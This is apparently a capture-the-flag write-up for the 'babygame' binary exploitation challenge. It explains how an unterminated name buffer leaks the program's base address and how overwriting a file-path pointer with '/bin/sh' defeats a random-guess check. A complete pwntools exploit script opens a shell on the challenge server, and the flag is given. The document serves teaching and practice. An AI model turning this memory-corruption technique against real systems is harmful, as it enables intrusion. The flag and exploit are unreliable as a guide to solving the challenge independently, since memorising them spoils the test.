# babygame

## Challenge

The binary firsts asks for our name, then we are allowed to print and change our name as many times as we want.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

The program has a secret option that allows us to spawn a shell if we correctly guess 4 bytes from /dev/urandom.

If we make our name 0x20 bytes long, the entire buffer will be filled and the stored string will not be null terminated.

The function for changing our name uses `strlen` to determine how many characters to read.

Since `obj.RANDBUF` is adjacent, we will gain an additional 0x6 bytes from the address of the `"/dev/urandom\x00"` string.

By printing our name, we can leak the base address of the executable.

When writing our name, we can overwrite this string address to point to another string with a valid file, such as `"/bin/sh\x00"`

We know the first 4 bytes of /bin/sh, so we can send our guess as `\x7fELF` formatted as a number in little endian.

This will spawn a shell and allow us to read the flag file.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn-2021.duc.tf --port 31907 babygame
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('babygame')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn-2021.duc.tf'
port = int(args.PORT or 31907)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.sendafter(b"name?\n", b"A" * 0x20)

io.sendlineafter(b"> ", b"2")

io.recvuntil(b"A" * 0x20)

leak = io.recvuntil(b"\n", drop=True)
print(leak)

exe.address = unpack(leak.ljust(8, b"\x00")) - next(exe.search(b'/dev/urandom\x00'))
io.info(hex(exe.address))

io.sendlineafter(b"> ", b"1")

io.sendafter(b"What would you like to change your username to?\n", b"A" * 0x20 + pack(next(exe.search(b'/bin/sh\x00')))[:-2])

io.sendlineafter(b"> ", b"1337")

guess = u32(b"\x7fELF")
print(guess)
io.sendlineafter(b"guess: ", str(guess).encode())

io.interactive()
```

## Flag

`DUCTF{whats_in_a_name?_5aacfc58}`

